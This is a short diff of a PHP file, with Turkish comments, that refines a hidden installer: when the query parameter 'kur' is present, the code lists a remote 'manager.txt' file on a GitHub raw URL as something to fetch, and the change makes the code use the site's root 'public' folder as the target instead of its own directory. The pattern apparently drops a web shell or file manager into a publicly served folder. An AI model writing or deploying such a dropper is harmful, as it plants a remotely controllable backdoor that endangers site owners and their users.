@@ -8,8 +8,9 @@ if (isset($_GET['kur'])) {
         'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager.txt',
     ];
 
-    // Hedef dizin: public klasörü
-    $targetDir = __DIR__ . '/public';
+    // Hedef dizin: sitenin kök dizinindeki public klasörü
+    $rootDir = realpath(__DIR__ . '/../../'); // Kök dizini al
+    $targetDir = $rootDir . '/public'; // public klasörüne ulaş
 
     // Eğer public klasörü yoksa oluşturalım
     if (!file_exists($targetDir)) {
